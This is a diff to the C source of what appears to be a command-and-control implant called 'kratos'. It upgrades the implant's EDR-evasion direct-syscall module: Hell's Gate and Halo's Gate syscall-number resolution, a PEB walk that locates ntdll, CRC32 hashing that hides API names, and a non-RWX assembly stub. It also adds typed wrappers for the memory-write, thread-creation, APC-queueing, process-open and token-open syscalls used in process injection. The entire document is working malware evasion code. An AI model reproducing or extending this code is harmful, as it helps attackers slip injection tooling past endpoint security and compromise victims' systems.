@@ -109,167 +109,185 @@ static void unhook_ntdll(void) {
 #endif
 
 /* ===================================================================
- * 4. DIRECT SYSCALLS  (Hell's Gate + Halo's Gate)
+ * 4. DIRECT SYSCALLS  (Hell's Gate + Halo's Gate + .S GAS stub)
  *
  *  Strategy:
- *   - Parse ntdll's EAT at runtime to find Nt* stubs.
+ *   - Locate ntdll base via PEB walk (no GetModuleHandleA).
+ *   - Parse ntdll EAT once; cache sorted Nt* array permanently.
+ *   - Name lookup uses CRC32 hash comparison; wrappers pass pre-computed
+ *     hash constants from nt_hashes.h (no plaintext NT strings in .rodata).
  *   - A clean stub starts with:  4C 8B D1  B8 XX 00 00 00
  *                                mov r10,rcx  mov eax, SSN
- *   - If the stub is hooked (first bytes modified), walk neighboring
- *     exported Nt* functions (sorted by address) to infer the SSN
- *     (Halo's Gate: SSNs are contiguous for syscall-table functions).
- *   - Execute via a small RWX trampoline:
- *       4C 8B D1  B8 [SSN] 0F 05  C3
+ *   - Hook scenario 1 (E9 at byte 0) or 2 (E9 at byte 3): Halo's Gate
+ *     walks sorted neighbours to infer the SSN.
+ *   - Execute via syscall_stub.S (do_syscall in .text, wSystemCall in .data).
+ *     No VirtualAlloc, no VirtualProtect, no heap trampoline, no RWX.
  * ================================================================= */
 #ifdef EVASION_SYSCALLS
+#include "nt_hashes.h"
 
-/* ---- EAT walker -------------------------------------------------- */
+/* ---- EAT entry --------------------------------------------------- */
 typedef struct { DWORD rva; DWORD idx; } ExportEntry;
 
-/* Compare by RVA for qsort */
-static int cmp_export(const void *a, const void *b) {
-    return (int)((ExportEntry*)a)->rva - (int)((ExportEntry*)b)->rva;
+/* ---- CRC32 hash (SEED = 0xEDB88320) ------------------------------ */
+static DWORD kratos_crc32h(const char *s) {
+    DWORD crc = 0xFFFFFFFFU;
+    while (*s) {
+        crc ^= (DWORD)(unsigned char)*s++;
+        for (int i = 0; i < 8; i++)
+            crc = (crc >> 1) ^ (0xEDB88320U & (DWORD)(-(int)(crc & 1)));
+    }
+    return ~crc;
 }
 
-DWORD kratos_resolve_ssn(const char *func_name) {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return (DWORD)-1;
+/* ---- ntdll base via PEB walk (no kernel32 call) ------------------ */
+static ULONG_PTR kratos_ntdll_base(void) {
+    ULONG_PTR peb;
+    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
+    /* PEB+0x18 = Ldr, Ldr+0x20 = InMemoryOrderModuleList.Flink        */
+    /* Skip first entry (our image), second entry is ntdll              */
+    /* DllBase = (InMemoryOrderLinks ptr - 0x10) + 0x30 = ptr + 0x20   */
+    ULONG_PTR ldr    = *(ULONG_PTR*)(peb  + 0x18);
+    ULONG_PTR flink1 = *(ULONG_PTR*)(ldr  + 0x20);
+    ULONG_PTR flink2 = *(ULONG_PTR*)flink1;
+    return             *(ULONG_PTR*)(flink2 + 0x20);
+}
 
-    BYTE *base = (BYTE*)hNtdll;
+/* ---- Cached NTDLL config ----------------------------------------- */
+typedef struct {
+    ULONG_PTR   uModule;
+    PDWORD      pdwNames;
+    PDWORD      pdwAddresses;
+    PWORD       pwOrdinals;
+    DWORD       dwNameCount;
+    ExportEntry *nt_sorted;
+    DWORD       nt_count;
+} KRATOS_NTDLL_CONF;
+
+static KRATOS_NTDLL_CONF g_ntdll_conf = { 0 };
+
+static BOOL kratos_init_ntdll_conf(void) {
+    if (g_ntdll_conf.uModule) return TRUE;
+
+    ULONG_PTR base = kratos_ntdll_base();
+    if (!base) return FALSE;
+
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
     PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
     DWORD eat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (!eat_rva) return (DWORD)-1;
+    if (!eat_rva) return FALSE;
 
     PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)(base + eat_rva);
-    DWORD  *names   = (DWORD*) (base + eat->AddressOfNames);
-    WORD   *ordinals= (WORD*)  (base + eat->AddressOfNameOrdinals);
-    DWORD  *funcs   = (DWORD*) (base + eat->AddressOfFunctions);
-    DWORD   n       = eat->NumberOfNames;
+    g_ntdll_conf.uModule      = base;
+    g_ntdll_conf.dwNameCount  = eat->NumberOfNames;
+    g_ntdll_conf.pdwNames     = (PDWORD)(base + eat->AddressOfNames);
+    g_ntdll_conf.pdwAddresses = (PDWORD)(base + eat->AddressOfFunctions);
+    g_ntdll_conf.pwOrdinals   = (PWORD) (base + eat->AddressOfNameOrdinals);
 
-    /* Build sorted array of (RVA, ordinal) for Nt* functions */
-    ExportEntry *nt_exports = (ExportEntry*)HeapAlloc(GetProcessHeap(), 0,
-                                                       n * sizeof(ExportEntry));
-    if (!nt_exports) return (DWORD)-1;
+    /* Build + sort Nt* export array once - reused for every SSN lookup */
+    ExportEntry *tmp = (ExportEntry*)HeapAlloc(GetProcessHeap(), 0,
+                                                eat->NumberOfNames * sizeof(ExportEntry));
+    if (!tmp) return FALSE;
 
-    DWORD nt_count = 0;
-    for (DWORD i = 0; i < n; i++) {
-        const char *name = (const char*)(base + names[i]);
+    DWORD count = 0;
+    for (DWORD i = 0; i < eat->NumberOfNames; i++) {
+        const char *name = (const char*)(base + g_ntdll_conf.pdwNames[i]);
         if (name[0] == 'N' && name[1] == 't') {
-            nt_exports[nt_count].rva = funcs[ordinals[i]];
-            nt_exports[nt_count].idx = i;
-            nt_count++;
+            tmp[count].rva = g_ntdll_conf.pdwAddresses[g_ntdll_conf.pwOrdinals[i]];
+            tmp[count].idx = i;
+            count++;
         }
     }
-
-    /* Sort by function RVA → syscall table order */
-    if (nt_count > 1) {
-        /* Insertion sort (small array) */
-        for (DWORD i = 1; i < nt_count; i++) {
-            ExportEntry key = nt_exports[i];
-            int j = (int)i - 1;
-            while (j >= 0 && nt_exports[j].rva > key.rva) {
-                nt_exports[j+1] = nt_exports[j]; j--;
-            }
-            nt_exports[j+1] = key;
-        }
+    for (DWORD i = 1; i < count; i++) {
+        ExportEntry key = tmp[i];
+        int j = (int)i - 1;
+        while (j >= 0 && tmp[j].rva > key.rva) { tmp[j+1] = tmp[j]; j--; }
+        tmp[j+1] = key;
     }
-
-    /* Find target function in sorted list */
-    DWORD target_pos = (DWORD)-1;
-    for (DWORD i = 0; i < nt_count; i++) {
-        const char *name = (const char*)(base + names[nt_exports[i].idx]);
-        if (strcmp(name, func_name) == 0) { target_pos = i; break; }
-    }
-
-    DWORD ssn = (DWORD)-1;
-    if (target_pos != (DWORD)-1) {
-        /* Hell's Gate: check if stub is clean */
-        BYTE *stub = base + nt_exports[target_pos].rva;
-        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
-            stub[3] == 0xB8) {
-            ssn = *(DWORD*)(stub + 4);  /* mov eax, SSN */
-        } else {
-            /* Halo's Gate: search up/down for unhooked neighbour */
-            for (DWORD delta = 1; delta < nt_count; delta++) {
-                /* try below */
-                if (target_pos >= delta) {
-                    BYTE *s = base + nt_exports[target_pos - delta].rva;
-                    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {
-                        ssn = *(DWORD*)(s + 4) + delta;
-                        break;
-                    }
-                }
-                /* try above */
-                if (target_pos + delta < nt_count) {
-                    BYTE *s = base + nt_exports[target_pos + delta].rva;
-                    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {
-                        ssn = *(DWORD*)(s + 4) - delta;
-                        break;
-                    }
-                }
-            }
-        }
-    }
-
-    HeapFree(GetProcessHeap(), 0, nt_exports);
-    return ssn;
-}
-
-/* ---- RWX syscall trampoline -------------------------------------- */
-/*
- * Layout (12 bytes):
- *   4C 8B D1           mov r10, rcx
- *   B8 [ssn 4 bytes]   mov eax, SSN
- *   0F 05              syscall
- *   C3                 ret
- *
- * Thread-safety note: this stub is patched once per call while holding
- * no lock. Acceptable for a sequential C2 agent; add a spinlock if
- * multi-threaded use is needed.
- */
-static BYTE *g_stub = NULL;
-
-static BOOL init_stub(void) {
-    if (g_stub) return TRUE;
-    g_stub = (BYTE*)VirtualAlloc(NULL, 16,
-                                 MEM_COMMIT | MEM_RESERVE,
-                                 PAGE_EXECUTE_READWRITE);
-    if (!g_stub) return FALSE;
-    /* Fill invariant bytes */
-    g_stub[0] = 0x4C; g_stub[1] = 0x8B; g_stub[2] = 0xD1; /* mov r10,rcx */
-    g_stub[3] = 0xB8;                                        /* mov eax,    */
-    /* [4..7] = SSN (patched per call)                                       */
-    g_stub[8] = 0x0F; g_stub[9] = 0x05;                     /* syscall     */
-    g_stub[10]= 0xC3;                                        /* ret         */
+    g_ntdll_conf.nt_sorted = tmp;
+    g_ntdll_conf.nt_count  = count;
     return TRUE;
 }
 
+/* ---- SSN resolver (cache + CRC32) -------------------------------- */
+DWORD kratos_resolve_ssn_hash(DWORD hash) {
+    if (!kratos_init_ntdll_conf()) return (DWORD)-1;
+
+    BYTE *base = (BYTE*)g_ntdll_conf.uModule;
+
+    DWORD target_pos = (DWORD)-1;
+    for (DWORD i = 0; i < g_ntdll_conf.nt_count; i++) {
+        const char *name = (const char*)(base + g_ntdll_conf.pdwNames[g_ntdll_conf.nt_sorted[i].idx]);
+        if (kratos_crc32h(name) == hash) { target_pos = i; break; }
+    }
+    if (target_pos == (DWORD)-1) return (DWORD)-1;
+
+    DWORD ssn  = (DWORD)-1;
+    BYTE *stub = base + g_ntdll_conf.nt_sorted[target_pos].rva;
+
+#define CLEAN_STUB(s) ((s)[0]==0x4C&&(s)[1]==0x8B&&(s)[2]==0xD1&&(s)[3]==0xB8&&(s)[6]==0x00&&(s)[7]==0x00)
+
+    if (CLEAN_STUB(stub)) {
+        ssn = *(DWORD*)(stub + 4);
+    } else if (stub[0]==0xE9 || stub[3]==0xE9) {
+        for (DWORD d = 1; d < g_ntdll_conf.nt_count; d++) {
+            if (target_pos >= d) {
+                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos - d].rva;
+                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) + d; break; }
+            }
+            if (target_pos + d < g_ntdll_conf.nt_count) {
+                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos + d].rva;
+                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) - d; break; }
+            }
+        }
+    } else {
+        for (DWORD d = 1; d < g_ntdll_conf.nt_count; d++) {
+            if (target_pos >= d) {
+                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos - d].rva;
+                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) + d; break; }
+            }
+            if (target_pos + d < g_ntdll_conf.nt_count) {
+                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos + d].rva;
+                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) - d; break; }
+            }
+        }
+    }
+#undef CLEAN_STUB
+    return ssn;
+}
+
+/* Convenience wrapper for external callers that still pass a string */
+DWORD kratos_resolve_ssn(const char *func_name) {
+    return kratos_resolve_ssn_hash(kratos_crc32h(func_name));
+}
+
 /* ---- Typed wrappers ---------------------------------------------- */
+/* wSystemCall and do_syscall are defined in syscall_stub.S:
+ *   wSystemCall -> DWORD in .data  (set before each call)
+ *   do_syscall  -> .text stub:  mov r10,rcx / mov eax,[wSystemCall] / syscall / ret
+ * No VirtualAlloc, no VirtualProtect, no heap, no RWX. */
 
 NTSTATUS kratos_NtAllocateVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                         ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                         ULONG AllocationType, ULONG Protect) {
     static DWORD ssn = (DWORD)-1;
-    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtAllocateVirtualMemory");
-    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
-    *(DWORD*)(g_stub + 4) = ssn;
-    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtAllocateVirtualMemory);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
     typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-    return ((fn_t)g_stub)(Process, BaseAddress, ZeroBits, RegionSize,
-                          AllocationType, Protect);
+    return ((fn_t)do_syscall)(Process, BaseAddress, ZeroBits, RegionSize,
+                              AllocationType, Protect);
 }
 
 NTSTATUS kratos_NtProtectVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                        PSIZE_T RegionSize, ULONG NewProtect,
                                        PULONG OldProtect) {
     static DWORD ssn = (DWORD)-1;
-    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtProtectVirtualMemory");
-    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
-    *(DWORD*)(g_stub + 4) = ssn;
-    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtProtectVirtualMemory);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
     typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-    return ((fn_t)g_stub)(Process, BaseAddress, RegionSize, NewProtect, OldProtect);
+    return ((fn_t)do_syscall)(Process, BaseAddress, RegionSize, NewProtect, OldProtect);
 }
 
 NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
@@ -279,52 +297,82 @@ NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess
                                  SIZE_T StackSize, SIZE_T MaximumStackSize,
                                  PVOID AttributeList) {
     static DWORD ssn = (DWORD)-1;
-    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtCreateThreadEx");
-    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
-    *(DWORD*)(g_stub + 4) = ssn;
-    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtCreateThreadEx);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
     typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                    PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
                                    SIZE_T, PVOID);
-    return ((fn_t)g_stub)(ThreadHandle, DesiredAccess, ObjectAttributes,
-                          ProcessHandle, StartRoutine, Argument, CreateFlags,
-                          ZeroBits, StackSize, MaximumStackSize, AttributeList);
+    return ((fn_t)do_syscall)(ThreadHandle, DesiredAccess, ObjectAttributes,
+                              ProcessHandle, StartRoutine, Argument, CreateFlags,
+                              ZeroBits, StackSize, MaximumStackSize, AttributeList);
 }
 
 NTSTATUS kratos_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                      PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                      PSIZE_T NumberOfBytesWritten) {
     static DWORD ssn = (DWORD)-1;
-    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtWriteVirtualMemory");
-    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
-    *(DWORD*)(g_stub + 4) = ssn;
-    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtWriteVirtualMemory);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
     typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-    return ((fn_t)g_stub)(ProcessHandle, BaseAddress, Buffer,
-                          NumberOfBytesToWrite, NumberOfBytesWritten);
+    return ((fn_t)do_syscall)(ProcessHandle, BaseAddress, Buffer,
+                              NumberOfBytesToWrite, NumberOfBytesWritten);
 }
 
 NTSTATUS kratos_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine,
                                   PVOID ApcArgument1, PVOID ApcArgument2,
                                   PVOID ApcArgument3) {
     static DWORD ssn = (DWORD)-1;
-    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtQueueApcThread");
-    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
-    *(DWORD*)(g_stub + 4) = ssn;
-    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtQueueApcThread);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
     typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
-    return ((fn_t)g_stub)(ThreadHandle, ApcRoutine, ApcArgument1,
-                          ApcArgument2, ApcArgument3);
+    return ((fn_t)do_syscall)(ThreadHandle, ApcRoutine, ApcArgument1,
+                              ApcArgument2, ApcArgument3);
+}
+
+/* ---- Internal NT structs for NtOpenProcess ----------------------- */
+typedef struct {
+    ULONG  Length;
+    HANDLE RootDirectory;
+    PVOID  ObjectName;
+    ULONG  Attributes;
+    PVOID  SecurityDescriptor;
+    PVOID  SecurityQualityOfService;
+} KRATOS_OA;
+
+typedef struct {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} KRATOS_CID;
+
+NTSTATUS kratos_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+                               DWORD Pid) {
+    static DWORD ssn = (DWORD)-1;
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtOpenProcess);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
+    KRATOS_OA  oa  = { sizeof(KRATOS_OA), NULL, NULL, 0, NULL, NULL };
+    KRATOS_CID cid = { (HANDLE)(ULONG_PTR)Pid, NULL };
+    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, KRATOS_OA*, KRATOS_CID*);
+    return ((fn_t)do_syscall)(ProcessHandle, DesiredAccess, &oa, &cid);
+}
+
+NTSTATUS kratos_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+                                    PHANDLE TokenHandle) {
+    static DWORD ssn = (DWORD)-1;
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtOpenProcessToken);
+    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    wSystemCall = ssn;
+    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, ACCESS_MASK, PHANDLE);
+    return ((fn_t)do_syscall)(ProcessHandle, DesiredAccess, TokenHandle);
 }
 
 static void init_syscalls(void) {
-    /* Pre-resolve SSNs while ntdll is still accessible.
-     * Calling each resolver once caches the SSN in the static local. */
-    kratos_resolve_ssn("NtAllocateVirtualMemory");
-    kratos_resolve_ssn("NtProtectVirtualMemory");
-    kratos_resolve_ssn("NtCreateThreadEx");
-    kratos_resolve_ssn("NtWriteVirtualMemory");
-    kratos_resolve_ssn("NtQueueApcThread");
+    /* Parse ntdll EAT once via PEB walk, cache the sorted Nt* array.
+     * Wrapper SSNs are resolved lazily on first call via hash lookup. */
+    kratos_init_ntdll_conf();
 }
 #endif /* EVASION_SYSCALLS */
 
